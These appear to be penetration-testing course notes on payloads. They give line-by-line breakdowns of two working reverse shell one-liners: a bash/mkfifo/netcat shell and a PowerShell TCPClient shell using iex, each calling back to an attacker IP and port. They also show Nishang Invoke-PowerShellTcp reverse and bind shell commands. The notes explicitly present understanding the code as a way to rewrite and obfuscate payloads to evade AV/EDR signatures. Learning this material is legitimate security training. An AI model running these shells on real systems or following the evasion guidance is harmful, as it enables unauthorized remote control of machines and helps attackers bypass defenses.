# Introduction to Payloads

## Core Definition

**Payload** = the actual command/code that performs the action (malicious or not) on the target.

> Demystifying note: "malware" sounds mysterious, but it's just **instructions** — same as any program. Understanding what each line does removes the mystery.
> 

---

## Methodology

```
Don't just copy-paste payloads → Break down each command → Understand WHY it works → Know what to modify for evasion
```

---

## Breakdown #1: Bash/Netcat Reverse Shell One-liner

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.12 7777 > /tmp/f
```

| Segment | What it does |
| --- | --- |
| `rm -f /tmp/f;` | Delete old pipe file if exists (`-f` ignores errors if missing) |
| `mkfifo /tmp/f;` | Create a FIFO named pipe at `/tmp/f` |
| `cat /tmp/f |` | Read from the pipe, send output into next command |
| `/bin/bash -i 2>&1 |` | Run **interactive** bash; redirect stderr (2) into stdout (1); pipe combined output |
| `nc 10.10.14.12 7777 > /tmp/f` | Connect to attacker IP:port; redirect Netcat's output back into the pipe (creates the loop) |

**The Loop Logic:**

```
pipe → bash reads commands → bash executes → output goes to nc → nc sends to attacker
                ↑__________________________________________________|
                    (output looped back into pipe via > /tmp/f)
```

---

## Breakdown #2: PowerShell Reverse Shell One-liner

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

| Segment | What it does |
| --- | --- |
| `powershell -nop -c` | Run PowerShell, **no profile** (`-nop` = faster/cleaner), execute command block (`-c`) |
| `$client = New-Object System.Net.Sockets.TCPClient(IP,PORT)` | Create TCP client object, connect to attacker |
| `$stream = $client.GetStream()` | Get the network stream for read/write |
| `[byte[]]$bytes = 0..65535|%{0}` | Create empty 65,535-byte buffer array |
| `while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0)` | Loop: read incoming data into buffer while connection is active |
| `$data = (New-Object ASCIIEncoding).GetString($bytes,0,$i)` | Convert received bytes → readable ASCII text (the command) |
| `$sendback = (iex $data 2>&1 | Out-String)` | **Invoke-Expression** runs the received command locally; capture output + errors as string |
| `$sendback2 = $sendback + 'PS ' + (pwd).Path + '> '` | Append fake `PS C:\path>` prompt to output (mimics real PowerShell) |
| `$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)` | Encode result back to bytes |
| `$stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()` | Send result back to attacker |
| `$client.Close()` | Close connection when loop ends |

**The Loop Logic:**

```
Read command from attacker → iex (execute) → encode output → send back → repeat
```

---

## Key PowerShell Cmdlet: `iex` (Invoke-Expression)

- Executes a string **as if it were typed PowerShell code**
- This is the core mechanism that turns received text into actual command execution
- Heavily monitored/flagged by AV/EDR due to its abuse potential

---

## Nishang Project — `Invoke-PowerShellTcp`

A reusable **PowerShell script (.ps1)** version of the same logic, supporting both modes:

```powershell
# Reverse shell
Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444

# Bind shell
Invoke-PowerShellTcp -Bind -Port 4444
```

> Same underlying TCPClient/Stream logic as the one-liner — just packaged as a reusable function with parameters
> 

---

## Key Insight: Why AV Blocks These

- AV/EDR recognize **patterns**: `TCPClient`, `iex`, `GetStream`, `mkfifo + bash -i + nc` combos
- These are **signature-matched** because they're so widely copy-pasted from public cheat sheets
- Understanding the code = ability to **rewrite/obfuscate** logic while keeping functionality (evade signature detection)

---

## Payload Variety

- **Manual one-liners** (what we just dissected) — typed/pasted directly
- **Scripts** (.ps1, .sh) — reusable, parameterized versions
- **Automated frameworks** (e.g., **Metasploit**) — generate and deploy payloads programmatically (covered next)

---

## Key Takeaways

- Every payload is just sequential instructions — nothing magical, just code most people don't read closely
- The same logical pattern (connect → read → execute → send output → loop) appears in both Bash and PowerShell reverse shells
- Understanding each line is what lets you modify payloads to bypass AV rather than relying on luck
- `iex`/`Invoke-Expression` is the critical line that turns received network data into code execution — a prime AV detection target
- Reusable scripts (like Nishang) wrap the same logic into flexible Bind/Reverse functions via parameters